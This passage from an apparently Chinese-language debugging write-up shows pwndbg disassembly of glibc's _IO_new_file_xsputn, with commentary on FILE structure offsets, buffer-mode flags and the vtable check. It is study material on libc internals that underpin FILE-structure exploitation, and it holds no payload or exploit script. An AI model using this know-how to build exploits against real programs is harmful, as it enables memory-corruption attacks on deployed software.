class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_xsputn:</span><br><span class="line">=&gt; 0x00007ffff7c8b600 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8b604 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c8b606 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c8b608 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8b60a &lt;+10&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8b60c &lt;+12&gt;:    xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c8b60f &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8b610 &lt;+16&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8b611 &lt;+17&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b615 &lt;+21&gt;:    test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8b618 &lt;+24&gt;:    je     0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b61a &lt;+26&gt;:    mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c8b61d &lt;+29&gt;:    mov    r13,rsi</span><br><span class="line">   0x00007ffff7c8b620 &lt;+32&gt;:    mov    rdi,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007ffff7c8b624 &lt;+36&gt;:    mov    rbx,rdx</span><br><span class="line">   0x00007ffff7c8b627 &lt;+39&gt;:    mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8b62a &lt;+42&gt;:    and    eax,0xa00</span><br><span class="line">   0x00007ffff7c8b62f &lt;+47&gt;:    cmp    eax,0xa00</span><br><span class="line">   0x00007ffff7c8b634 &lt;+52&gt;:    je     0x7ffff7c8b680 &lt;_IO_new_file_xsputn+128&gt;</span><br><span class="line">   0x00007ffff7c8b636 &lt;+54&gt;:    mov    r12,QWORD PTR [rbp+0x30]</span><br><span class="line">   0x00007ffff7c8b63a &lt;+58&gt;:    cmp    r12,rdi</span><br><span class="line">   0x00007ffff7c8b63d &lt;+61&gt;:    jbe    0x7ffff7c8b6a0 &lt;_IO_new_file_xsputn+160&gt;</span><br><span class="line">   0x00007ffff7c8b63f &lt;+63&gt;:    sub    r12,rdi</span><br><span class="line">   0x00007ffff7c8b642 &lt;+66&gt;:    xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b645 &lt;+69&gt;:    test   r12,r12</span><br><span class="line">   0x00007ffff7c8b648 &lt;+72&gt;:    je     0x7ffff7c8b6a0 &lt;_IO_new_file_xsputn+160&gt;</span><br><span class="line">   0x00007ffff7c8b64a &lt;+74&gt;:    cmp    r12,rbx</span><br><span class="line">   0x00007ffff7c8b64d &lt;+77&gt;:    mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b650 &lt;+80&gt;:    mov    r15,rbx</span><br><span class="line">   0x00007ffff7c8b653 &lt;+83&gt;:    cmova  r12,rbx</span><br><span class="line">   0x00007ffff7c8b657 &lt;+87&gt;:    mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b65a &lt;+90&gt;:    add    r13,r12</span><br><span class="line">   0x00007ffff7c8b65d &lt;+93&gt;:    sub    r15,r12</span><br><span class="line">   0x00007ffff7c8b660 &lt;+96&gt;:    call   0x7ffff7c283e0 &lt;*ABS*+0xa97d0@plt&gt;</span><br><span class="line">   0x00007ffff7c8b665 &lt;+101&gt;:   mov    QWORD PTR [rbp+0x28],rax</span><br><span class="line">   0x00007ffff7c8b669 &lt;+105&gt;:   add    r14,r15</span><br><span class="line">   0x00007ffff7c8b66c &lt;+108&gt;:   jne    0x7ffff7c8b6a3 &lt;_IO_new_file_xsputn+163&gt;</span><br><span class="line">   0x00007ffff7c8b66e &lt;+110&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b672 &lt;+114&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8b675 &lt;+117&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8b676 &lt;+118&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8b677 &lt;+119&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8b679 &lt;+121&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8b67b &lt;+123&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8b67d &lt;+125&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8b67f &lt;+127&gt;:   ret</span><br><span class="line">   0x00007ffff7c8b680 &lt;+128&gt;:   mov    r12,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8b684 &lt;+132&gt;:   lea    rax,[rsi+rdx*1]</span><br><span class="line">   0x00007ffff7c8b688 &lt;+136&gt;:   sub    r12,rdi</span><br><span class="line">   0x00007ffff7c8b68b &lt;+139&gt;:   cmp    rdx,r12</span><br><span class="line">   0x00007ffff7c8b68e &lt;+142&gt;:   jbe    0x7ffff7c8b73d &lt;_IO_new_file_xsputn+317&gt;</span><br><span class="line">   0x00007ffff7c8b694 &lt;+148&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b697 &lt;+151&gt;:   test   r12,r12</span><br><span class="line">   0x00007ffff7c8b69a &lt;+154&gt;:   jne    0x7ffff7c8b64a &lt;_IO_new_file_xsputn+74&gt;</span><br><span class="line">   0x00007ffff7c8b69c &lt;+156&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b6a0 &lt;+160&gt;:   mov    r15,rbx</span><br><span class="line">   0x00007ffff7c8b6a3 &lt;+163&gt;:   mov    rax,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c8b6aa &lt;+170&gt;:   lea    r14,[rip+0x18b34f]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8b6b1 &lt;+177&gt;:   lea    r12,[rip+0x18c0b0]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8b6b8 &lt;+184&gt;:   sub    r12,r14</span><br><span class="line">   0x00007ffff7c8b6bb &lt;+187&gt;:   mov    rdx,rax</span><br><span class="line">   0x00007ffff7c8b6be &lt;+190&gt;:   sub    rdx,r14</span><br><span class="line">   0x00007ffff7c8b6c1 &lt;+193&gt;:   cmp    r12,rdx</span><br><span class="line">   0x00007ffff7c8b6c4 &lt;+196&gt;:   jbe    0x7ffff7c8b880 &lt;_IO_new_file_xsputn+640&gt;</span><br><span class="line">   0x00007ffff7c8b6ca &lt;+202&gt;:   mov    esi,0xffffffff</span><br><span class="line">   0x00007ffff7c8b6cf &lt;+207&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b6d2 &lt;+210&gt;:   call   QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8b6d5 &lt;+213&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8b6d8 &lt;+216&gt;:   je     0x7ffff7c8b830 &lt;_IO_new_file_xsputn+560&gt;</span><br><span class="line">   0x00007ffff7c8b6de &lt;+222&gt;:   mov    rcx,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8b6e2 &lt;+226&gt;:   sub    rcx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8b6e6 &lt;+230&gt;:   mov    r8,r15</span><br><span class="line">   0x00007ffff7c8b6e9 &lt;+233&gt;:   cmp    rcx,0x7f</span><br><span class="line">   0x00007ffff7c8b6ed &lt;+237&gt;:   jbe    0x7ffff7c8b6fa &lt;_IO_new_file_xsputn+250&gt;</span><br><span class="line">   0x00007ffff7c8b6ef &lt;+239&gt;:   mov    rax,r15</span><br><span class="line">   0x00007ffff7c8b6f2 &lt;+242&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8b6f4 &lt;+244&gt;:   div    rcx</span><br><span class="line">   0x00007ffff7c8b6f7 &lt;+247&gt;:   sub    r8,rdx</span><br><span class="line">   0x00007ffff7c8b6fa &lt;+250&gt;:   test   r8,r8</span><br><span class="line">   0x00007ffff7c8b6fd &lt;+253&gt;:   jne    0x7ffff7c8b750 &lt;_IO_new_file_xsputn+336&gt;</span><br><span class="line">   0x00007ffff7c8b6ff &lt;+255&gt;:   mov    r12,rbx</span><br><span class="line">   0x00007ffff7c8b702 &lt;+258&gt;:   test   r15,r15</span><br><span class="line">   0x00007ffff7c8b705 &lt;+261&gt;:   je     0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b70b &lt;+267&gt;:   lea    rsi,[r13+r8*1+0x0]</span><br><span class="line">   0x00007ffff7c8b710 &lt;+272&gt;:   mov    rdx,r15</span><br><span class="line">   0x00007ffff7c8b713 &lt;+275&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b716 &lt;+278&gt;:   call   0x7ffff7c8ddc0 &lt;__GI__IO_default_xsputn&gt;</span><br><span class="line">   0x00007ffff7c8b71b &lt;+283&gt;:   sub    rax,r15</span><br><span class="line">   0x00007ffff7c8b71e &lt;+286&gt;:   add    r12,rax</span><br><span class="line">   0x00007ffff7c8b721 &lt;+289&gt;:   jmp    0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b726 &lt;+294&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b730 &lt;+304&gt;:   sub    rax,0x1</span><br><span class="line">   0x00007ffff7c8b734 &lt;+308&gt;:   cmp    BYTE PTR [rax],0xa</span><br><span class="line">   0x00007ffff7c8b737 &lt;+311&gt;:   je     0x7ffff7c8b850 &lt;_IO_new_file_xsputn+592&gt;</span><br><span class="line">   0x00007ffff7c8b73d &lt;+317&gt;:   cmp    r13,rax</span><br><span class="line">   0x00007ffff7c8b740 &lt;+320&gt;:   jb     0x7ffff7c8b730 &lt;_IO_new_file_xsputn+304&gt;</span><br><span class="line">   0x00007ffff7c8b742 &lt;+322&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b745 &lt;+325&gt;:   jmp    0x7ffff7c8b64a &lt;_IO_new_file_xsputn+74&gt;</span><br><span class="line">   0x00007ffff7c8b74a &lt;+330&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b750 &lt;+336&gt;:   mov    rax,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c8b757 &lt;+343&gt;:   test   DWORD PTR [rbp+0x0],0x1000</span><br><span class="line">   0x00007ffff7c8b75e &lt;+350&gt;:   jne    0x7ffff7c8b870 &lt;_IO_new_file_xsputn+624&gt;</span><br><span class="line">   0x00007ffff7c8b764 &lt;+356&gt;:   mov    rdx,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8b768 &lt;+360&gt;:   mov    rsi,QWORD PTR [rbp+0x20]</span><br><span class="line">   0x00007ffff7c8b76c &lt;+364&gt;:   cmp    rdx,rsi</span><br><span class="line">   0x00007ffff7c8b76f &lt;+367&gt;:   je     0x7ffff7c8b7b1 &lt;_IO_new_file_xsputn+433&gt;</span><br><span class="line">   0x00007ffff7c8b771 &lt;+369&gt;:   mov    rcx,rax</span><br><span class="line">   0x00007ffff7c8b774 &lt;+372&gt;:   sub    rcx,r14</span><br><span class="line">   0x00007ffff7c8b777 &lt;+375&gt;:   cmp    r12,rcx</span><br><span class="line">   0x00007ffff7c8b77a &lt;+378&gt;:   jbe    0x7ffff7c8b8fd &lt;_IO_new_file_xsputn+765&gt;</span><br><span class="line">   0x00007ffff7c8b780 &lt;+384&gt;:   sub    rsi,rdx</span><br><span class="line">   0x00007ffff7c8b783 &lt;+387&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b787 &lt;+391&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8b78c &lt;+396&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b78f &lt;+399&gt;:   call   QWORD PTR [rax+0x80]</span><br><span class="line">   0x00007ffff7c8b795 &lt;+405&gt;:   cmp    rax,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b799 &lt;+409&gt;:   je     0x7ffff7c8b8aa &lt;_IO_new_file_xsputn+682&gt;</span><br><span class="line">   0x00007ffff7c8b79f &lt;+415&gt;:   mov    QWORD PTR [rbp+0x90],rax</span><br><span class="line">   0x00007ffff7c8b7a6 &lt;+422&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b7aa &lt;+426&gt;:   mov    rax,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c8b7b1 &lt;+433&gt;:   mov    rdx,rax</span><br><span class="line">   0x00007ffff7c8b7b4 &lt;+436&gt;:   sub    rdx,r14</span><br><span class="line">   0x00007ffff7c8b7b7 &lt;+439&gt;:   cmp    r12,rdx</span><br><span class="line">   0x00007ffff7c8b7ba &lt;+442&gt;:   jbe    0x7ffff7c8b8e1 &lt;_IO_new_file_xsputn+737&gt;</span><br><span class="line">   0x00007ffff7c8b7c0 &lt;+448&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b7c4 &lt;+452&gt;:   mov    rdx,r8</span><br><span class="line">   0x00007ffff7c8b7c7 &lt;+455&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b7ca &lt;+458&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b7cd &lt;+461&gt;:   call   QWORD PTR [rax+0x78]</span><br><span class="line">   0x00007ffff7c8b7d0 &lt;+464&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b7d4 &lt;+468&gt;:   mov    r14,rax</span><br><span class="line">   0x00007ffff7c8b7d7 &lt;+471&gt;:   movzx  eax,WORD PTR [rbp+0x80]</span><br><span class="line">   0x00007ffff7c8b7de &lt;+478&gt;:   test   r14,r14</span><br><span class="line">   0x00007ffff7c8b7e1 &lt;+481&gt;:   je     0x7ffff7c8b7ec &lt;_IO_new_file_xsputn+492&gt;</span><br><span class="line">   0x00007ffff7c8b7e3 &lt;+483&gt;:   test   ax,ax</span><br><span class="line">   0x00007ffff7c8b7e6 &lt;+486&gt;:   jne    0x7ffff7c8b8c0 &lt;_IO_new_file_xsputn+704&gt;</span><br><span class="line">   0x00007ffff7c8b7ec &lt;+492&gt;:   mov    rax,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8b7f0 &lt;+496&gt;:   mov    edx,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c8b7f6 &lt;+502&gt;:   movq   xmm0,rax</span><br><span class="line">   0x00007ffff7c8b7fb &lt;+507&gt;:   mov    QWORD PTR [rbp+0x28],rax</span><br><span class="line">   0x00007ffff7c8b7ff &lt;+511&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8b803 &lt;+515&gt;:   movups XMMWORD PTR [rbp+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8b807 &lt;+519&gt;:   movups XMMWORD PTR [rbp+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8b80b &lt;+523&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8b80d &lt;+525&gt;:   jle    0x7ffff7c8b898 &lt;_IO_new_file_xsputn+664&gt;</span><br><span class="line">   0x00007ffff7c8b813 &lt;+531&gt;:   mov    rax,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8b817 &lt;+535&gt;:   mov    QWORD PTR [rbp+0x30],rax</span><br><span class="line">   0x00007ffff7c8b81b &lt;+539&gt;:   cmp    r14,r8</span><br><span class="line">   0x00007ffff7c8b81e &lt;+542&gt;:   jb     0x7ffff7c8b8ad &lt;_IO_new_file_xsputn+685&gt;</span><br><span class="line">   0x00007ffff7c8b824 &lt;+548&gt;:   sub    r15,r14</span><br><span class="line">   0x00007ffff7c8b827 &lt;+551&gt;:   jmp    0x7ffff7c8b6ff &lt;_IO_new_file_xsputn+255&gt;</span><br><span class="line">   0x00007ffff7c8b82c &lt;+556&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b830 &lt;+560&gt;:   sub    rbx,r15</span><br><span class="line">   0x00007ffff7c8b833 &lt;+563&gt;:   mov    rax,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b83a &lt;+570&gt;:   test   r15,r15</span><br><span class="line">   0x00007ffff7c8b83d &lt;+573&gt;:   mov    r12,rbx</span><br><span class="line">   0x00007ffff7c8b840 &lt;+576&gt;:   cmove  r12,rax</span><br><span class="line">   0x00007ffff7c8b844 &lt;+580&gt;:   jmp    0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b849 &lt;+585&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b850 &lt;+592&gt;:   sub    rax,r13</span><br><span class="line">   0x00007ffff7c8b853 &lt;+595&gt;:   add    rax,0x1</span><br><span class="line">   0x00007ffff7c8b857 &lt;+599&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c8b85a &lt;+602&gt;:   jne    0x7ffff7c8b921 &lt;_IO_new_file_xsputn+801&gt;</span><br><span class="line">   0x00007ffff7c8b860 &lt;+608&gt;:   mov    r15,rbx</span><br><span class="line">   0x00007ffff7c8b863 &lt;+611&gt;:   mov    r14d,0x1</span><br><span class="line">   0x00007ffff7c8b869 &lt;+617&gt;:   jmp    0x7ffff7c8b669 &lt;_IO_new_file_xsputn+105&gt;</span><br><span class="line">   0x00007ffff7c8b86e &lt;+622&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8b870 &lt;+624&gt;:   mov    QWORD PTR [rbp+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b87b &lt;+635&gt;:   jmp    0x7ffff7c8b7b1 &lt;_IO_new_file_xsputn+433&gt;</span><br><span class="line">   0x00007ffff7c8b880 &lt;+640&gt;:   mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x00007ffff7c8b884 &lt;+644&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b889 &lt;+649&gt;:   mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b88d &lt;+653&gt;:   jmp    0x7ffff7c8b6ca &lt;_IO_new_file_xsputn+202&gt;</span><br><span class="line">   0x00007ffff7c8b892 &lt;+658&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b898 &lt;+664&gt;:   test   DWORD PTR [rbp+0x0],0x202</span><br><span class="line">   0x00007ffff7c8b89f &lt;+671&gt;:   jne    0x7ffff7c8b817 &lt;_IO_new_file_xsputn+535&gt;</span><br><span class="line">   0x00007ffff7c8b8a5 &lt;+677&gt;:   jmp    0x7ffff7c8b813 &lt;_IO_new_file_xsputn+531&gt;</span><br><span class="line">   0x00007ffff7c8b8aa &lt;+682&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b8ad &lt;+685&gt;:   sub    rbx,r15</span><br><span class="line">   0x00007ffff7c8b8b0 &lt;+688&gt;:   mov    r12,rbx</span><br><span class="line">   0x00007ffff7c8b8b3 &lt;+691&gt;:   add    r12,r14</span><br><span class="line">   0x00007ffff7c8b8b6 &lt;+694&gt;:   jmp    0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b8bb &lt;+699&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b8c0 &lt;+704&gt;:   lea    edi,[rax-0x1]</span><br><span class="line">   0x00007ffff7c8b8c3 &lt;+707&gt;:   mov    edx,r14d</span><br><span class="line">   0x00007ffff7c8b8c6 &lt;+710&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b8c9 &lt;+713&gt;:   call   0x7ffff7c8e8b0 &lt;__GI__IO_adjust_column&gt;</span><br><span class="line">   0x00007ffff7c8b8ce &lt;+718&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b8d2 &lt;+722&gt;:   add    eax,0x1</span><br><span class="line">   0x00007ffff7c8b8d5 &lt;+725&gt;:   mov    WORD PTR [rbp+0x80],ax</span><br><span class="line">   0x00007ffff7c8b8dc &lt;+732&gt;:   jmp    0x7ffff7c8b7ec &lt;_IO_new_file_xsputn+492&gt;</span><br><span class="line">   0x00007ffff7c8b8e1 &lt;+737&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c8b8e6 &lt;+742&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b8ea &lt;+746&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b8ef &lt;+751&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8b8f4 &lt;+756&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b8f8 &lt;+760&gt;:   jmp    0x7ffff7c8b7c0 &lt;_IO_new_file_xsputn+448&gt;</span><br><span class="line">   0x00007ffff7c8b8fd &lt;+765&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c8b902 &lt;+770&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b906 &lt;+774&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b90b &lt;+779&gt;:   mov    rsi,QWORD PTR [rbp+0x20]</span><br><span class="line">   0x00007ffff7c8b90f &lt;+783&gt;:   mov    rdx,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8b913 &lt;+787&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8b918 &lt;+792&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b91c &lt;+796&gt;:   jmp    0x7ffff7c8b780 &lt;_IO_new_file_xsputn+384&gt;</span><br><span class="line">   0x00007ffff7c8b921 &lt;+801&gt;:   mov    r14d,0x1</span><br><span class="line">   0x00007ffff7c8b927 &lt;+807&gt;:   jmp    0x7ffff7c8b64a &lt;_IO_new_file_xsputn+74&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试，还是先判断了写入字节数是否为0，为0直接返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b604 &lt;_IO_file_xsputn+4&gt;     push   r15</span><br><span class="line">0x7ffff7c8b606 &lt;_IO_file_xsputn+6&gt;     push   r14</span><br><span class="line">0x7ffff7c8b608 &lt;_IO_file_xsputn+8&gt;     push   r13</span><br><span class="line">0x7ffff7c8b60a &lt;_IO_file_xsputn+10&gt;    push   r12</span><br><span class="line">0x7ffff7c8b60c &lt;_IO_file_xsputn+12&gt;    xor    r12d, r12d     R12D =&gt; 0</span><br><span class="line">0x7ffff7c8b60f &lt;_IO_file_xsputn+15&gt;    push   rbp</span><br><span class="line">0x7ffff7c8b610 &lt;_IO_file_xsputn+16&gt;    push   rbx</span><br><span class="line">0x7ffff7c8b611 &lt;_IO_file_xsputn+17&gt;    sub    rsp, 0x18      RSP =&gt; 0x7fffffffdc40 (0x7fffffffdc58 - 0x18)</span><br><span class="line">0x7ffff7c8b615 &lt;_IO_file_xsputn+21&gt;    test   rdx, rdx       0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b618 &lt;_IO_file_xsputn+24&gt;  ✘ je     _IO_file_xsputn+110         &lt;_IO_file_xsputn+110&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8b66e &lt;+110&gt;:   add    rsp,0x18</span><br><span class="line">0x00007ffff7c8b672 &lt;+114&gt;:   mov    rax,r12</span><br><span class="line">0x00007ffff7c8b675 &lt;+117&gt;:   pop    rbx</span><br><span class="line">0x00007ffff7c8b676 &lt;+118&gt;:   pop    rbp</span><br><span class="line">0x00007ffff7c8b677 &lt;+119&gt;:   pop    r12</span><br><span class="line">0x00007ffff7c8b679 &lt;+121&gt;:   pop    r13</span><br><span class="line">0x00007ffff7c8b67b &lt;+123&gt;:   pop    r14</span><br><span class="line">0x00007ffff7c8b67d &lt;+125&gt;:   pop    r15</span><br><span class="line">0x00007ffff7c8b67f &lt;+127&gt;:   ret</span><br></pre></td></tr></table></figure><p>继续往后<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b620 &lt;_IO_file_xsputn+32&gt;     mov    rdi, qword ptr [rdi + 0x28]     RDI, [0x5555555592c8] =&gt; 0</span><br><span class="line">0x7ffff7c8b624 &lt;_IO_file_xsputn+36&gt;     mov    rbx, rdx                        RBX =&gt; 0x20</span><br><span class="line">0x7ffff7c8b627 &lt;_IO_file_xsputn+39&gt;     mov    eax, dword ptr [rbp]            EAX, [0x5555555592a0] =&gt; 0xfbad2488</span><br><span class="line">0x7ffff7c8b62a &lt;_IO_file_xsputn+42&gt;     and    eax, 0xa00                      EAX =&gt; 0 (0xfbad2488 &amp; 0xa00)</span><br><span class="line">0x7ffff7c8b62f &lt;_IO_file_xsputn+47&gt;     cmp    eax, 0xa00                      0x0 - 0xa00     EFLAGS =&gt; 0x287 [ CF PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8b634 &lt;_IO_file_xsputn+52&gt;   ✘ je     _IO_file_xsputn+128         &lt;_IO_file_xsputn+128&gt;</span><br></pre></td></tr></table></figure><p><code>[rdi+0x28]</code>即<code>_IO_FILE_plus</code>偏移0x28处的 <code>_IO_write_ptr</code>，将其保存，然后检查 <code>_flags &amp; 0xa00 == 0xa00</code>，这是判断是否为 <code>_IO_LINE_BUF</code> 或 <code>_IO_UNBUFFERED</code>（判断缓冲模式），若是，则跳到另一分支处理，先不管，往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b636 &lt;_IO_file_xsputn+54&gt;     mov    r12, qword ptr [rbp + 0x30]     R12, [0x5555555592d0] =&gt; 0</span><br><span class="line">0x7ffff7c8b63a &lt;_IO_file_xsputn+58&gt;     cmp    r12, rdi                        0 - 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b63d &lt;_IO_file_xsputn+61&gt;   ✔ jbe    _IO_file_xsputn+160         &lt;_IO_file_xsputn+160&gt;</span><br></pre></td></tr></table></figure><p>这里<code>[rbp+0x30]</code>即<code>_IO_FILE_plus</code>偏移0x30处的 <code>_IO_write_end</code>，如果<code>_IO_write_ptr</code>&gt;&#x3D; <code>_IO_write_end</code>，则写缓冲区不足，跳转<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6a0 &lt;_IO_file_xsputn+160&gt;    mov    r15, rbx                        R15 =&gt; 0x20</span><br><span class="line">0x7ffff7c8b6a3 &lt;_IO_file_xsputn+163&gt;    mov    rax, qword ptr [rbp + 0xd8]     RAX, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8b6aa &lt;_IO_file_xsputn+170&gt;    lea    r14, [rip + 0x18b34f]           R14 =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8b6b1 &lt;_IO_file_xsputn+177&gt;    lea    r12, [rip + 0x18c0b0]           